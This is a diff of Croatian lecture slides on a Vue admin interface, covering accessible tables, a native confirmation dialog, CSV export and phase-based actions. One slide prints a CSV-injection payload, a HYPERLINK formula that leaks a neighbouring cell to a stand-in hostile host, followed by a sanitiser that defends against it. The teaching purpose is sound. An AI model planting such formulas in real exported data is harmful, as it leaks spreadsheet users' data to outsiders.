+\vspace{0.2em}
+Ćelije se ne prelamaju, a okvir oko tablice dopušta vodoravno pomicanje, pa redak ostaje jedan redak. Cijena je da korisnik na mobitelu dio stupaca vidi tek nakon pomicanja.
+
+\vspace{0.2em}
+Druga mogućnost je ispod zadane širine svaki redak prikazati kao karticu. Takav raspored traži zaseban CSS za uski zaslon i gubi usporedbu po stupcima.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Smjer razvrstavanja u zaglavlju}
+Tipkovnica ne dolazi do naslova stupca na koji se klikne mišem, a čitač zaslona ne zna po kojem je stupcu popis razvrstan.
+
+\begin{lstlisting}[language=html]
+<!-- src/components/AdminRegistrations.vue -->
+<th scope="col" :aria-sort="ariaSort('name')">
+  <button class="sort" type="button" @click="sortBy('name')">
+    Natjecatelj
+  </button>
+</th>
+\end{lstlisting}
+
+\begin{lstlisting}[language=typescript]
+const ariaSort = (key: SortKey) => sortKey.value === key
+  ? (sortDir.value === 'asc' ? 'ascending' : 'descending') : undefined
+\end{lstlisting}
+
+\vspace{0.1em}
+Gumb u zaglavlju dostupan je tipkovnici. \texttt{aria-sort} čitaču zaslona javlja stupac i smjer, a CSS iz istog atributa crta strelicu, pa se dvije oznake ne mogu razići.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Radnja koja se ne poništava}
+Gumb \enquote{Obriši} stoji u svakom retku, a promašen klik trajno briše natjecatelja.
+
+\vspace{0.5em}
+\begin{center}
+{\small
+\setlength{\tabcolsep}{6pt}
+\renewcommand{\arraystretch}{1.35}
+\begin{tabular}{@{}L{3.2cm}L{7.0cm}L{1.6cm}@{}}
+  \toprule
+  \textbf{Radnja} & \textbf{Poništava se} & \textbf{Potvrda} \\
+  \midrule
+  odjava prijave & gumbom \enquote{Vrati prijavu}, do konačnog roka & ne \\
+  povratak prijave & ponovnom odjavom & ne \\
+  brisanje natjecatelja & ne & da \\
+  \bottomrule
+\end{tabular}
+}
+\end{center}
+
+\vspace{0.4em}
+\begin{konvencija}
+Potvrdu traži samo radnja koja se ne može poništiti. Korisnik koji potvrđuje svaku radnju nauči potvrđivati bez čitanja, pa potvrda prestane štititi i ondje gdje treba.
+\end{konvencija}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Dijalog za potvrdu (I)}
+Dijalog mora jednako raditi s mišem, tipkovnicom i čitačem zaslona:
 
 \vspace{0.5em}
 \begin{center}
 {\small
 \setlength{\tabcolsep}{6pt}
 \renewcommand{\arraystretch}{1.3}
-\begin{tabular}{@{}L{3.4cm}L{3.9cm}L{3.9cm}@{}}
+\begin{tabular}{@{}L{4.7cm}L{3.4cm}L{3.8cm}@{}}
   \toprule
-  \textbf{Ulaz} & \textbf{Usporedba znakova} & \textbf{Usporedba po jeziku} \\
+  \textbf{Zahtjev} & \texttt{div} \textbf{sa zastorom} & \texttt{dialog}, \texttt{showModal()} \\
   \midrule
-  Cvor, Čop, Duda & Cvor, Duda, Čop & Cvor, Čop, Duda \\
+  fokus ulazi u dijalog & piše se & preglednik \\
+  Tab ostaje u dijalogu & piše se & preglednik \\
+  ostatak stranice nedostupan & samo mišu, zastorom & preglednik \\
+  Escape zatvara dijalog & piše se & preglednik \\
+  fokus se vraća na gumb & piše se & preglednik \\
+  iznad cijele stranice & premještanje u \texttt{body} & preglednik \\
   \bottomrule
 \end{tabular}
 }
 \end{center}
 
+\vspace{0.5em}
+Svaki redak srednjeg stupca je kod koji se može zaboraviti, a dijalog bez nekoga od njih korisnik tipkovnice ne može koristiti.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Dijalog za potvrdu (II)}
+\begin{lstlisting}[language=typescript]
+// src/components/ConfirmDialog.vue
+function sync(open: boolean) {
+  if (!dialog.value) return
+  if (open && !dialog.value.open) dialog.value.showModal()
+  if (!open && dialog.value.open) dialog.value.close()
+}
+watch(() => props.open, sync)
+\end{lstlisting}
+
+\vspace{0.3em}
+Element \texttt{dialog} otvoren metodom \texttt{showModal()} sve iz tablice radi sam: drži fokus, ostatak stranice čini nedostupnim i javlja Escape. Iscrtava se u gornjem sloju (engl. \emph{top layer}), iznad svakog elementa stranice, pa ga ne odsijeca ni okvir tablice u kojem je nastao.
+
+\vspace{0.3em}
+Je li dijalog otvoren, odlučuje roditelj kroz \texttt{open}; \texttt{sync} to stanje prenosi na element.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Dijalog za potvrdu (III)}
+\begin{lstlisting}[language=html]
+<!-- src/components/ConfirmDialog.vue -->
+<dialog ref="dialog" class="dialog" :aria-labelledby="titleId"
+        @cancel.prevent="emit('cancel')">
+  <h2 :id="titleId">{{ title }}</h2>
+  <slot />
+  <button class="btn btn-secondary" type="button" autofocus
+          @click="emit('cancel')">Odustani</button>
+  <!-- <@gumb s natpisom radnje, npr. \enquote{Obriši}@> -->
+</dialog>
+\end{lstlisting}
+
+\vspace{0.3em}
+Preglednik pritisak na Escape javlja događajem \texttt{cancel}. \texttt{.prevent} sprječava da dijalog zatvori sam, pa o zatvaranju i dalje odlučuje roditelj.
+
+\vspace{0.3em}
+\texttt{autofocus} pri otvaranju stavlja fokus na \enquote{Odustani}. Enter tako ne izvodi radnju koja se ne poništava.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Potvrda na mjestu upotrebe (I)}
+\begin{lstlisting}[language=typescript]
+// src/views/LiftersView.vue
+const toDelete = ref<Lifter | null>(null)
+async function confirmDelete() {
+  const lifter = toDelete.value
+  if (!lifter) return
+  toDelete.value = null
+  await deleteLifter(auth.clubId!, lifter.id)
+  <@\komts{uklanjanje iz pohrane i obavijest, ili odbijanje}@>
+  ...
+}
+\end{lstlisting}
+
+\vspace{0.3em}
+Gumb \enquote{Obriši} u retku ne briše. Upisuje natjecatelja u \texttt{toDelete}, a dijalog se otvara jer je \texttt{toDelete} različit od \texttt{null}.
+
+\vspace{0.3em}
+\texttt{confirmDelete} se poziva tek na potvrdu. Prvo zatvara dijalog, pa šalje zahtjev; poslužitelj natjecatelja s prijavama ne briše i odgovara kodom \texttt{has\_registrations}.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Potvrda na mjestu upotrebe (II)}
+\begin{lstlisting}[language=html]
+<!-- src/views/LiftersView.vue -->
+<ConfirmDialog :open="toDelete !== null" title="Brisanje natjecatelja"
+  confirm-label="<@Obriši@>" danger
+  @confirm="confirmDelete" @cancel="toDelete = null">
+  <p>
+    Natjecatelj
+    <strong>{{ toDelete?.first_name }} {{ toDelete?.last_name }}</strong>
+    <@bit će obrisan. Brisanje se ne može poništiti.@>
+  </p>
+</ConfirmDialog>
+\end{lstlisting}
+
+\vspace{0.3em}
+Dijalog nosi ime natjecatelja, jer korisnik u tom trenutku gleda dijalog, a ne redak u kojem je kliknuo.
+
+\vspace{0.3em}
+Natpis gumba je glagol radnje, \enquote{Obriši}. Natpis \enquote{U redu} ne bi rekao što će se dogoditi.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Vježba: dijalog bez miša}
+Prijavljeni ste kao klub \texttt{behemot@plreg.hr}. Ana Horvat prijavljena je na \emph{Zimski kup}.
+
 \vspace{0.6em}
-Obična usporedba gleda brojčane vrijednosti znakova. Slova s dijakriticima u tom poretku stoje iza svih ostalih, pa Čop završava iza Dude.
-
-\vspace{0.4em}
-Metoda \texttt{localeCompare} s oznakom jezika, dakle \texttt{localeCompare(b, 'hr')}, uspoređuje po pravilima tog jezika. Bez nje popis prezimena izgleda razvrstano dok se u njemu ne pojavi prvo prezime s dijakritikom.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Niz izvedenih vrijednosti}
-Dohvaćeni popis do prikazanog retka prolazi kroz nekoliko koraka, a svaki je izvedena vrijednost koja ovisi o prethodnoj:
-
-\vspace{0.7em}
-\begin{center}
-\texttt{prijave} $\rightarrow$ \texttt{suzene} $\rightarrow$ \texttt{poredane} $\rightarrow$ prikaz
-\end{center}
-
-\vspace{0.9em}
-Promjena upita mijenja \texttt{suzene}, a onda i \texttt{poredane}, bez ijednog retka koji to povezuje. Promjena stanja mijenja parametre zahtjeva i pokreće novi dohvat.
-
-\vspace{0.9em}
-Korak koji se u ovom nizu izvodi na poslužitelju, dakle podjela na stranice i filtar po stanju, stoji prije svih ostalih: preglednik sužava i razvrstava ono što je dobio.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Vježba: filtar i poredak}
-Radite nad popisom prijava kao organizator.
-
-\vspace{0.8em}
 \begin{enumerate}
-  \itemsep0.4em
-  \item Dodajte izbor stanja prijave koji se šalje kao parametar upita.
-  \item Odjavite jednu prijavu, pa prođite kroz oba stanja izbora.
-  \item Dodajte pretragu po prezimenu koja radi u pregledniku.
-  \item Prijeđite na drugu stranicu popisa i potražite prezime koje stoji na prvoj.
-  \item Dodajte razvrstavanje po prezimenu i upišite natjecatelja s prezimenom na \v{Z}.
+  \itemsep0.35em
+  \item Dodajte natjecatelja Test Brisanje, rođenog 01.01.2000., muškog spola.
+  \item Samo tipkovnicom dođite do gumba \enquote{Obriši} u njegovu retku i pritisnite Enter.
+  \item Pritisnite Tab nekoliko puta i pratite koji element ima fokus.
+  \item Pritisnite Escape i provjerite koji element ima fokus.
+  \item Obrišite natjecatelja Test Brisanje, pa na isti način pokušajte obrisati Anu Horvat.
 \end{enumerate}
 
-\vspace{0.8em}
-Zašto je u četvrtom koraku rezultat prazan i što bi trebalo promijeniti da ne bude?
-\end{frame}
-
-% ============================================================
-\sekcija{Tablica i radnje nad retkom}{Dijelovi tablice, uski zaslon, potvrda prije radnje koja se ne poništava i preuzimanje popisa.}
-
-% ------------------------------------------------------------
-\begin{frame}{Dijelovi tablice}
-\vspace{0.3em}
-\begin{center}
-{\small
-\setlength{\tabcolsep}{6pt}
-\renewcommand{\arraystretch}{1.3}
-\begin{tabular}{@{}L{2.9cm}L{8.3cm}@{}}
-  \toprule
-  \textbf{Dio} & \textbf{Čemu služi} \\
-  \midrule
-  zaglavlje & imena stupaca i, kad se razvrstava, oznaka smjera \\
-  redak & jedan zapis, s oznakom iz baze kao ključem \\
-  zadnji stupac & radnje nad tim zapisom \\
-  iznad tablice & filtri i pretraga \\
-  ispod tablice & prijelaz među stranicama \\
-  umjesto tablice & poruka kad nijedan zapis ne odgovara \\
-  \bottomrule
-\end{tabular}
-}
-\end{center}
-
 \vspace{0.6em}
-Poruka kad nijedan zapis ne odgovara filtru nije ista kao poruka kad zapisa uopće nema. Prva kaže da se filtar može ublažiti, druga da se može upisati prvi zapis.
+Koji je element imao fokus nakon otvaranja dijaloga i nakon Escapea i zašto, a koja je provjera odlučila o brisanju u petom koraku?
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Tablica na uskom zaslonu}
-Tablica sa šest stupaca na zaslonu mobitela ne stane. Kad se prelomi, redak se razlije preko tri retka i stupci se više ne poklapaju.
-
-\begin{lstlisting}[language=html]
-<div class="tablica-okvir">
-  <table> ... </table>
-</div>
-\end{lstlisting}
-
-\begin{lstlisting}[language=html]
-/* assets/main.css */
-.tablica-okvir { overflow-x: auto; }
-\end{lstlisting}
-
-\vspace{0.4em}
-Okvir oko tablice dopušta vodoravno pomicanje, pa redak ostaje jedan redak. Potpunija rješenja mijenjaju raspored ispod zadane širine i svaki redak prikazuju kao karticu.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Radnja koja se ne poništava}
-Gumb za odjavu prijave mijenja stanje zapisa čim se klikne. Klik je lako promašiti, a popis ima dvadeset redaka s istim gumbom.
-
-\vspace{0.9em}
-Ponovna prijava u ovoj aplikaciji postoji, pa je šteta popravljiva. Brisanje natjecatelja nije, i ondje je promašen klik trajan.
-
-\vspace{0.9em}
-Zato radnja koja mijenja ili uklanja zapis traži potvrdu: prvi klik pita, drugi izvodi. Uz potvrdu se kaže i što se točno mijenja, s imenom zapisa, jer korisnik u tom trenutku više ne gleda redak.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile]{Dijalog za potvrdu}
-\begin{lstlisting}[language=html]
-<!-- components/Potvrda.vue -->
-<script setup lang="ts">
-defineProps<{ otvoren: boolean; poruka: string }>()
-defineEmits<{ potvrdi: []; odustani: [] }>()
-</script>
-<template>
-  <div v-if="otvoren" class="zastor" @click="$emit('odustani')">
-    <div class="dijalog" @click.stop>
-      <p>{{ poruka }}</p>
-      <button @click="$emit('odustani')">Odustani</button>
-      <button @click="$emit('potvrdi')" class="btn-danger">Odjavi</button>
-    </div>
-  </div>
-</template>
-\end{lstlisting}
-
-\vspace{0.4em}
-Oznaka \texttt{.stop} zaustavlja širenje klika prema zastoru, pa klik unutar dijaloga ne zatvara dijalog.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile]{Mjesto dijaloga u stablu}
-Dijalog pokriva cijeli zaslon, a nastaje unutar retka tablice. Svojstvo nadređenog elementa, primjerice skrivanje svega što prelazi njegovu širinu, tada odsiječe i dijalog.
-
-\begin{lstlisting}[language=html]
-<Teleport to="body">
-  <div v-if="otvoren" class="zastor"> ... </div>
-</Teleport>
-\end{lstlisting}
-
-\vspace{0.4em}
-\texttt{Teleport} sadržaj upisuje na kraj stranice, izvan nadređenih elemenata, a komponenta ostaje na svojem mjestu u stablu komponenata: svojstva i događaji rade kao i prije.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile]{Preuzimanje popisa}
-Organizatoru popis treba i izvan aplikacije. Preglednik datoteku može sastaviti sam, iz podataka koje već ima:
+\begin{frame}[fragile]{Preuzimanje popisa (I)}
+Organizator treba popis i izvan aplikacije, primjerice za suce. Preglednik datoteku može sastaviti sam, iz podataka koje ima, bez zahtjeva prema poslužitelju:
 
 \begin{lstlisting}[language=typescript]
-export function preuzmiCsv(redci: string[][], ime: string) {
-  const tekst = redci.map((r) => r.join(',')).join('\n')
-  const url = URL.createObjectURL(
-    new Blob([tekst], { type: 'text/csv' }))
-  const a = document.createElement('a')
-  a.href = url
-  a.download = ime
-  a.click()
+// src/lib/download.ts
+export function downloadText(filename: string, text: string,
+                             type: string) {
+  const url = URL.createObjectURL(new Blob([text], { type }))
+  const link = document.createElement('a')
+  link.href = url
+  link.download = filename
+  link.click()
   URL.revokeObjectURL(url)
 }
 \end{lstlisting}
 
-\vspace{0.4em}
-Preuzima se ono što je u pregledniku, dakle trenutna stranica. Popis cijelog natjecanja tražio bi dohvat svih stranica ili rutu na poslužitelju koja ga sastavlja.
+\vspace{0.2em}
+Datoteka sastavljena od podataka na zaslonu imala bi samo prikazanu stranicu, a izgledala bi potpuno.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Vježba: potvrda prije odjave}
-Radite nad popisom prijava u kojem svaki redak ima gumb za odjavu.
+\begin{frame}[fragile]{Preuzimanje popisa (II)}
+\begin{lstlisting}[language=typescript]
+// src/api/registrations.ts
+export async function fetchAllRegistrations(
+  compId: number,
+  status?: RegistrationStatus,
+): Promise<Registration[]> {
+  const all: Registration[] = []
+  for (let offset = 0; ; offset += MAX_LIMIT) {
+    const page = await fetchRegistrations(compId,
+      { status, limit: MAX_LIMIT, offset })
+    all.push(...page)
+    if (page.length < MAX_LIMIT) return all
+  }
+}
+\end{lstlisting}
 
-\vspace{0.8em}
-\begin{enumerate}
-  \itemsep0.4em
-  \item Dodajte dijalog za potvrdu i pokažite u njemu ime i prezime natjecatelja iz retka.
-  \item Odjavite jednu prijavu i u kartici Mreža provjerite kada je zahtjev poslan.
-  \item Kliknite odjavu, pa odustanite, i provjerite stanje prijave u popisu.
-  \item Stavite dijalog u \texttt{Teleport} i usporedite gdje se u stablu elemenata pojavio.
-\end{enumerate}
+\vspace{0.1em}
+Popis se dohvaća po najvećem dopuštenom dijelu, uz isti filtar kao na zaslonu. Kraj se prepoznaje po kraćem odgovoru; uz broj zapisa djeljiv sa sto to stoji jedan prazan zahtjev.
+\end{frame}
 
-\vspace{0.8em}
-Koji se zahtjev poslao u trećem koraku i koja se radnja u ovoj aplikaciji doista ne može poništiti?
+% ------------------------------------------------------------
+\begin{frame}{Datoteka za tablični kalkulator (I)}
+Format CSV je tekst: redak po zapisu, vrijednosti odvojene razdjelnikom. Tablični kalkulator ga čita prema svojim postavkama, pa ista datoteka kod organizatora može izgledati pokvareno:
+
+\vspace{0.5em}
+\begin{center}
+{\small
+\setlength{\tabcolsep}{6pt}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}L{3.6cm}L{4.4cm}L{4.0cm}@{}}
+  \toprule
+  \textbf{Zamka} & \textbf{Što organizator vidi} & \textbf{Rješenje} \\
+  \midrule
+  zarez kao razdjelnik & cijeli redak u prvom stupcu & točka sa zarezom \\
+  kodna stranica & ÄŒolak umjesto Čolak & oznaka na početku \\
+  razdjelnik u vrijednosti & redak pomaknut za stupac & vrijednost u navodnicima \\
+  vrijednost počinje s \texttt{=} & izvedena formula & apostrof na početku \\
+  \bottomrule
+\end{tabular}
+}
+\end{center}
+
+\vspace{0.6em}
+Sva rješenja iz tablice stoje u \codefile{src/lib/csv.ts}, u funkciji koja od redaka sastavlja tekst datoteke.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Datoteka za tablični kalkulator (II)}
+Excel kodiranje UTF-8 prepoznaje po oznaci redoslijeda bajtova (engl. \emph{byte order mark}, BOM) na početku datoteke. Bez nje datoteku čita u kodnoj stranici sustava, pa slovo Č, koje u UTF-8 zauzima dva bajta, prikaže kao dva znaka.
+
+\vspace{0.6em}
+Razdjelnik ovisi o postavkama računala na kojem se datoteka otvara, a ne o datoteci.
+
+\vspace{0.6em}
+\begin{konvencija}[Izbor, ne pravilo]
+Standard za CSV (RFC 4180) propisuje zarez, a Excel razdjelnik čita iz regionalnih postavki računala, u kojima je uz hrvatske postavke zarez decimalni znak. Projekt bira točku sa zarezom, jer datoteku otvaraju organizatori s hrvatskim postavkama.
+\end{konvencija}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Formula u ćeliji (I)}
+Ime natjecatelja upisuje klub, a datoteku otvara organizator. Klub kao ime može upisati:
+
+\begin{lstlisting}
+=HYPERLINK("https://zlonamjerna.example/?p="&A2; "Pogledaj")
+\end{lstlisting}
+
+\vspace{0.2em}
+Organizatorov kalkulator tu vrijednost izvodi kao formulu i prikazuje poveznicu, a klik na nju šalje sadržaj susjedne ćelije na tuđu adresu. Napad se naziva ubacivanje formule (engl. \emph{CSV injection}).
+
+\vspace{0.6em}
+Vrijednost je ispravna po svakom pravilu sheme: neprazan tekst u dopuštenoj duljini. Opasna postaje tek u drugom programu, na računalu drugog korisnika.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Formula u ćeliji (II)}
+\begin{lstlisting}[language=typescript]
+// src/lib/csv.ts
+function cell(value: string | number): string {
+  let text = String(value)
+  if (/^[=+\-@\t\r]/.test(text)) text = `'${text}`
+  if (/[";\r\n]/.test(text)) text = `"${text.replaceAll('"', '""')}"`
+  return text
+}
+\end{lstlisting}
+
+\vspace{0.3em}
+Vrijednost koja počinje znakom kojim kalkulator započinje formulu dobiva apostrof na početku i ostaje tekst.
+
+\vspace{0.3em}
+Zatim se vrijednost s navodnikom, razdjelnikom ili prijelomom retka stavlja u navodnike, a navodnik u njoj se udvostručuje.
+
+\vspace{0.3em}
+Zaštita stoji na mjestu na kojem podatak prelazi u drugi program: pri sastavljanju datoteke, a ne pri upisu imena.
 \end{frame}
 
 % ============================================================
-\sekcija{Sučelje koje poznaje pravila}{Razdoblje u odgovoru, skrivena i onemogućena radnja, stanje koje zastari.}
+\sekcija{Korisničko sučelje koje poznaje pravila}{Razdoblje u odgovoru, radnje izvedene iz razdoblja, skrivena i onemogućena radnja, razlog uz gumb, razdoblje koje zastari, prikaz prema ulozi.}
 
 % ------------------------------------------------------------
-\begin{frame}{Gumb koji vodi u odbijen zahtjev}
-Popis prijava nakon konačnog roka izgleda isto kao i prije njega: svaki redak nudi promjenu kategorije i odjavu.
+\begin{frame}[fragile]{Odbijena radnja (I)}
+Korisničko sučelje koje ne zna za rokove nakon konačnog roka izgleda isto kao prije njega. Klub klikne \enquote{Odjavi} uz jednu prijavu:
 
-\vspace{0.9em}
-Klik na bilo koju od njih šalje zahtjev koji poslužitelj odbija s kodom \texttt{deadline\_passed}. Korisnik dobiva poruku tek nakon što je radnju već pokušao.
+\begin{lstlisting}
+POST /api/competitions/1/registrations/41/withdraw
+400 {"code": "deadline_passed",
+     "message": "Izmjene nisu <@moguće@> nakon finalnog roka"}
+\end{lstlisting}
 
-\vspace{0.9em}
-Isto vrijedi za ulogu. Klub koji otvori popis vidi gumb za novo natjecanje, a svaki njegov pokušaj završava odgovorom \texttt{403}.
+\vspace{0.5em}
+Poslužitelj radnju ispravno odbija. Korisnik o pravilu saznaje tek nakon što je radnju pokušao, iz poruke o pogrešci.
+
+\vspace{0.5em}
+Tako je sa svakom radnjom u svakom retku: korisničko sučelje nudi radnje koje poslužitelj u tom trenutku odbija.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Razdoblje u odgovoru}
-Sučelje razdoblje ne računa samo. Odgovor o natjecanju nosi ga kao polje, izvedeno iz dvaju rokova pri svakom zahtjevu:
+\begin{frame}[fragile]{Odbijena radnja (II)}
+Prvi odgovor koji se nameće je razdoblje izračunati u pregledniku, iz dvaju rokova. Isti uvjet tada stoji na dvama mjestima, a sat preglednika i sat poslužitelja ne moraju pokazivati isto vrijeme.
+
+\vspace{0.4em}
+Drugi je odgovor razdoblje preuzeti od poslužitelja. Odgovor o natjecanju ima polje \texttt{phase}, koje poslužitelj računa pri svakom zahtjevu:
 
 \begin{lstlisting}[language=json]
 {"id": 1, "name": "Zimski kup", "date": "2027-03-14",
- "prelim_deadline": "2027-02-14T23:59:00+01:00",
- "final_deadline": "2027-03-07T23:59:00+01:00",
- "phase": "open"}
+ "prelim_deadline": "2027-02-14T22:59:00Z",
+ "final_deadline": "2027-03-07T22:59:00Z", "phase": "open"}
 \end{lstlisting}
 
-\vspace{0.4em}
-Vrijednosti su \texttt{open}, \texttt{prelim\_passed} i \texttt{closed}.
-
-\vspace{0.4em}
-Da sučelje razdoblje računa iz rokova samo, isti bi uvjet postojao na dvama mjestima. Sat preglednika i sat poslužitelja pritom ne moraju pokazivati isto.
+\vspace{0.3em}
+Vrijednosti su \texttt{open}, \texttt{prelim\_passed} i \texttt{closed}. Korisničko sučelje iz razdoblja izvodi koje radnje nudi, a pravilo i dalje provodi poslužitelj.
 \end{frame}
 
 % ------------------------------------------------------------
 \begin{frame}[fragile]{Radnje izvedene iz razdoblja}
 \begin{lstlisting}[language=typescript]
-const razdoblje = computed(() => natjecanje.value?.phase)
-
-const smijePrijaviti = computed(() => razdoblje.value === 'open')
-const smijeMijenjati = computed(() =>
-  razdoblje.value === 'open' || razdoblje.value === 'prelim_passed')
+// src/lib/phase.ts
+const MATRIX: Record<Phase, AllowedActions> = {
+  open: { register: true, changeStatus: true },
+  prelim_passed: { register: false, changeStatus: true },
+  closed: { register: false, changeStatus: false },
+}
+export const allowedActions = (phase: Phase): AllowedActions =>
+  MATRIX[phase]
 \end{lstlisting}
 
-\vspace{0.4em}
-Uvjeti se pišu jednom, kao izvedene vrijednosti, a predložak ih samo čita. Isti uvjet raspisan uz svaki gumb mijenjao bi se na svakom gumbu posebno.
+\begin{lstlisting}[language=typescript]
+// src/components/ClubRegistrations.vue
+const allowed = computed(() => allowedActions(props.competition.phase))
+\end{lstlisting}
 
-\vspace{0.4em}
-Imena uvjeta govore što se smije, ne koje je razdoblje. Dodano razdoblje time mijenja jedan redak, a ne svaki predložak.
+\vspace{0.2em}
+Matrica prepisuje pravila koja na poslužitelju provodi sloj \texttt{services}, pa se mijenja zajedno s njima.
+
+\vspace{0.2em}
+Imena kažu što se smije, a ne koje je razdoblje. Novo razdoblje mijenja jedan redak matrice, a ne uvjet uz svaki gumb.
 \end{frame}
 
 % ------------------------------------------------------------
@@ -517,93 +885,188 @@ Imena uvjeta govore što se smije, ne koje je razdoblje. Dodano razdoblje time m
 {\small
 \setlength{\tabcolsep}{6pt}
 \renewcommand{\arraystretch}{1.3}
-\begin{tabular}{@{}L{2.6cm}L{4.2cm}L{4.4cm}@{}}
+\begin{tabular}{@{}L{3.6cm}L{3.6cm}L{3.8cm}@{}}
   \toprule
    & \textbf{Skriveno} & \textbf{Onemogućeno} \\
   \midrule
-  U stablu & nema ga & ima ga, bez odziva \\
-  Korisnik zna da postoji & ne & da \\
-  Poruka zašto & nema je & u opisu gumba \\
+  U stablu elemenata & nema ga & ima ga, bez odziva \\
+  Korisnik zna za radnju & ne & da \\
+  Razlog & nema ga & tekst uz radnju \\
   \bottomrule
 \end{tabular}
 }
 \end{center}
 
 \vspace{0.6em}
-Radnja koju korisnik u ovoj ulozi nikada neće smjeti izvesti skriva se: gumb za novo natjecanje klubu samo smeta.
-
-\vspace{0.4em}
-Radnja koja je bila dopuštena, a sada nije, ostaje vidljiva i onemogućena, uz kratko objašnjenje. Nestala bez traga, izgledala bi kao kvar.
+\begin{konvencija}
+Radnju koju korisnik u svojoj ulozi nikada ne smije izvesti korisničko sučelje skriva: klub ne vidi poveznicu na administraciju. Radnja koja je bila dopuštena, a više nije, ostaje vidljiva i onemogućena, uz razlog; nestala bez traga izgledala bi kao kvar.
+\end{konvencija}
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Oboje u predlošku}
-\begin{lstlisting}[language=html]
-<RouterLink v-if="auth.organizator" to="/admin/competitions/new">
-  Novo natjecanje
-</RouterLink>
+\begin{frame}[fragile]{Razlog uz onemogućeni gumb}
+Opis u atributu \texttt{title} pojavi se tek kad miš stoji iznad gumba. Tipkovnica i dodir ga ne prikazuju, a onemogućeni gumb ne može dobiti fokus.
 
-<button @click="prijavi" :disabled="!smijePrijaviti"
-        :title="smijePrijaviti ? '' : 'Rok za nove prijave je istekao'">
-  Nova prijava
-</button>
+\begin{lstlisting}[language=html]
+<!-- src/components/ClubRegistrations.vue -->
+<p v-if="!allowed.changeStatus" id="change-reason" class="note">
+  {{ REASONS.changeStatus }}
+</p>
+...
+<button class="btn btn-secondary btn-small" type="button"
+  :disabled="!allowed.changeStatus"
+  :aria-describedby="allowed.changeStatus ? undefined : 'change-reason'"
+  @click="changeStatus(r)">
 \end{lstlisting}
 
-\vspace{0.4em}
-Uloga odlučuje postoji li element, razdoblje odlučuje odaziva li se.
+\vspace{0.1em}
+Razlog zato stoji kao tekst iznad tablice, vidljiv svima. \texttt{aria-describedby} ga veže uz svaki gumb, pa ga čitač zaslona pročita uz natpis gumba.
 
-\vspace{0.4em}
-Nijedno od toga nije zaštita. Isti zahtjev poslan mimo sučelja poslužitelj i dalje odbija, s kodom \texttt{forbidden} ili \texttt{deadline\_passed}.
+\vspace{0.2em}
+Obrazac nove prijave nakon preliminarnog roka zamjenjuje rečenica s razlogom, jer bi cijeli obrazac bez odziva samo zauzimao mjesto.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Stanje koje zastari}
-Razdoblje je pročitano pri otvaranju stranice. Korisnik stranicu može ostaviti otvorenu, a rok u međuvremenu istječe.
+\begin{frame}{Razdoblje koje zastari (I)}
+Razdoblje je pročitano pri otvaranju stranice. Korisnik stranicu ostavi otvorenu, a rok u međuvremenu istekne.
 
-\vspace{0.7em}
+\vspace{0.6em}
 \begin{itemize}
   \itemsep0.45em
-  \item Gumb i dalje izgleda dopušteno, jer je \texttt{phase} iz starog odgovora.
-  \item Zahtjev koji korisnik pošalje poslužitelj odbija, jer on vrijeme čita u trenutku zahtjeva.
-  \item Korisnik vidi poruku koju nije očekivao.
+  \item Gumb i dalje izgleda dopušten, jer je \texttt{phase} iz starog odgovora.
+  \item Poslužitelj zahtjev odbija s kodom \texttt{deadline\_passed}, jer vrijeme čita u trenutku zahtjeva.
 \end{itemize}
 
+\pause
 \vspace{0.7em}
-Odbijanje je ispravno i ono je jedina pouzdana obrana. Sučelje se uz to može osvježiti kad korisnik pokrene radnju ili kad se vrati na karticu, a rok prikazati kao vrijeme preostalo do isteka.
+Odbijanje je ispravno i jedina je pouzdana obrana. Korisničko sučelje ne može znati kada će netko pomaknuti rok ni kada će rok isteći dok stranica stoji otvorena.
+
+\vspace{0.6em}
+Ono što korisničko sučelje može jest prepoznati da je prikazano razdoblje zastarjelo i dohvatiti natjecanje ponovno, da se gumbi usklade s novim razdobljem.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Vježba: zastarjelo razdoblje}
-Potrebna su vam dva računa: organizator \texttt{admin@plreg.hr} i klub \texttt{behemot@plreg.hr}.
+\begin{frame}[fragile]{Razdoblje koje zastari (II)}
+\begin{lstlisting}[language=typescript]
+// src/composables/useStatusChange.ts
+async function changeStatus(registration: Registration) {
+  try {
+    ...
+  } catch (e) {
+    ...
+    if (e instanceof ApiError && e.code === 'deadline_passed')
+      options.onStale()
+    throw e
+  }
+}
+\end{lstlisting}
 
-\vspace{0.8em}
+\vspace{0.3em}
+Odgovor \texttt{deadline\_passed} znači da prikazano razdoblje više ne vrijedi. Komponenta poziv \texttt{onStale} prosljeđuje roditelju kao događaj \texttt{stale}, a stranica natjecanja na njega dohvaća natjecanje ponovno.
+
+\vspace{0.3em}
+Iznimka se zatim baca dalje, pa korisnik i dalje dobiva poruku o pogrešci.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Razdoblje koje zastari (III)}
+Stranica ostavljena otvorenom u drugoj kartici ne šalje zahtjeve, pa zastarjelo razdoblje ne otkriva ni odbijen zahtjev. Preglednik javlja kad korisnik karticu ponovno pogleda:
+
